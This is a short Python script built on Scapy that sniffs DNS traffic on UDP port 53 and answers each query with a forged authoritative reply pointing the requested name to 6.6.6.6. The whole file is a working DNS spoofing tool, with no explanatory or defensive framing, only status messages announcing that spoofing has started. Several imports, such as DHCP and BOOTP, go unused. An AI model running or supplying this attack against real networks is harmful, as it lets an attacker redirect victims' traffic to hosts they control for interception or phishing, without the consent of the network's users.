from scapy.all import sendp, Ether, IP, UDP, BOOTP, DHCP, DNS, DNSRR, DNSQR, sniff, send
import random

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR): 
        spoofed_ip = "6.6.6.6"  # Fake IP address
        qname = pkt[DNSQR].qname.decode()

        print(f"⚠️ Spoofing DNS reply for {qname}")

        spoofed_pkt = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=qname, ttl=10, rdata=spoofed_ip))
        )

        send(spoofed_pkt, verbose=0)

print("🚨 DNS spoofing started...")
sniff(filter="udp port 53", prn=dns_spoof, store=0)
